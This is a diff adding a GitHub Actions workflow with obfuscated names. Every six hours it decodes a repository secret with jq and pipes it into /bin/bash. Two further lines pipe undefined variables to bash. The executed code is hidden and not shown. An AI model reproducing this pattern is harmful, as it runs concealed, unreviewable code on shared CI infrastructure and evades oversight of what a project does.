@@ -1,0 +1,19 @@
+name: caoyukaiming
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caoyukaiming
+        env:
+          ughq1065: ${{ secrets.ughq1065 }}
+        run: |
+          echo $ughq1065 | jq -r .v1 | /bin/bash
+          echo $z4632 | jq -r .al180 | /bin/bash
+          echo $fsi5 | jq -r .hyc0 | /bin/bash
+
